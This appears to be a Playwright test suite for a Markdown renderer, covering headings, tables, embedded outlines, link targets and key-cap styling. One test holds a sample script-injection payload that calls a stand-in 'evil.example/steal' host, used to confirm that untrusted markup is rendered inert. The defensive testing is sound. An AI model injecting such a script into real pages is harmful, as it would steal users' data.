import { expect, test } from "../fixtures";

test.describe("Markdown", () => {
  test("draws a document with headings, lists, a table and code blocks", async ({ example }) => {
    const stage = await example("markdown/document");
    await expect(stage.getByRole("heading", { level: 1, name: "Rolling out a release" })).toBeVisible();
    await expect(stage.getByRole("heading", { level: 2 })).toHaveCount(3);
    await expect(stage.getByRole("columnheader")).toHaveCount(4);
    await expect(stage.getByRole("row")).toHaveCount(4);
    await expect(stage.getByRole("checkbox", { name: "Completed", exact: true })).toHaveCount(2);
    await expect(stage.getByRole("button", { name: "Copy code" })).toHaveCount(2);
    await expect(stage.getByRole("link", { name: "stage reference" })).toHaveAttribute("href", "/reference/stages");
  });

  test("an embedded document continues the outline of its card", async ({ example }) => {
    const stage = await example("markdown/embedded");
    await expect(stage.getByRole("heading", { level: 4 })).toHaveCount(2);
    await expect(stage.getByRole("heading", { level: 5, name: "Still to do" })).toBeVisible();
    await expect(stage.getByRole("heading", { level: 1 })).toHaveCount(0);
  });

  test("untrusted markup and addresses are never live", async ({ page, example }) => {
    let dialogs = 0;
    page.on("dialog", (dialog) => {
      dialogs += 1;
      void dialog.dismiss();
    });
    const requests: string[] = [];
    page.on("request", (request) => requests.push(request.url()));

    const stage = await example("markdown/untrusted");
    await expect(stage.getByText('<script>fetch("https://evil.example/steal")</script>')).toBeVisible();
    await expect(stage.locator("script, img, iframe")).toHaveCount(0);
    await expect(stage.getByRole("link")).toHaveCount(0);
    await expect(stage.getByText("See my notes and this tracking pixel.")).toHaveCount(2);
    expect(dialogs).toBe(0);
    expect(requests.filter((url) => url.includes("evil.example"))).toEqual([]);
  });

  test("links report their activation and off-site links open a new tab", async ({ page, example }) => {
    const stage = await example("markdown/links");
    const external = stage.getByRole("link", { name: /your Miniflux instance/ });
    const internal = stage.getByRole("link", { name: "delivery log" });
    await expect(external).toHaveAttribute("target", "_blank");
    await expect(external).toHaveAttribute("rel", /noopener/);
    await expect(internal).not.toHaveAttribute("target", "_blank");

    const url = page.url();
    await internal.focus();
    await page.keyboard.press("Enter");
    await expect(stage.getByRole("status")).toHaveText("Followed /workflows/deliveries");
    expect(page.url()).toBe(url);
  });

  test("keys written as kbd are drawn as key caps", async ({ example }) => {
    const stage = await example("markdown/keys");
    const keys = stage.locator("kbd");
    await expect(keys).toHaveText(["Ctrl", "K", "?"]);
    await expect(keys.first()).toHaveClass(/yi-kbd/);
  });
});
